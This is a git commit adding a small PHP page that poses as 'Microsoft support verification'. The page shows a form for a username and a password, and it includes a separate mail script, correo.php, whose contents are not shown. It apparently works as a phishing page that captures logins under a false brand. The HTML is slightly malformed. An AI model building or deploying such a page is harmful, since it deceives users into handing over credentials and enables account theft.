954fb5f457ef469c7ee84aef1d094940bbb3462a
Fazt <marielanavaa@hotmail.com>
2020-02-24 23:25:42 -0500

    primer commit de mi sitio web

---
+++ probando.php
@@ -0,0 +1,19 @@
+<html>
+<head> 
+    <title>soporte microsoft verifique</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial -scale=1, maximum-scale=1, minimum-scale=1">
+    <link rel="stylesheet" href="estilos.css">
+    </head>
+    <body>
+ <form method="post">
+     <h2>soporte microsoft verifique</h2>
+     <input type="text"placeholder="Usuario" name="usuario" required="">
+     <input type="text"placeholder="Contraseña" name="clave" required="">
+     <input type="submit" name="enviar"
+    </form>
+ <?Php
+include ("correo.php");
+?>
+</body>
+</html>
